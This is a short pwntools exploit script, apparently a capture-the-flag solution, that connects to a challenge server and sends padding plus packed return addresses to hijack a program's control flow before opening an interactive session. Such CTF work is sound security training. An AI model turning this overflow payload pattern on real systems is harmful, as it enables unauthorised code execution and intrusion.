from pwn import *
context.terminal = ['tmux', 'split']

p = remote("chal.ctf-league.osusec.org", 1309)
p.sendline(b"hi" + p32(0x08049240))
p.sendline(b"aaaaaaaaaaaaaaaaaaaaaaaa" + p32(0x08049192) + p32(0x08049192))
p.interactive()
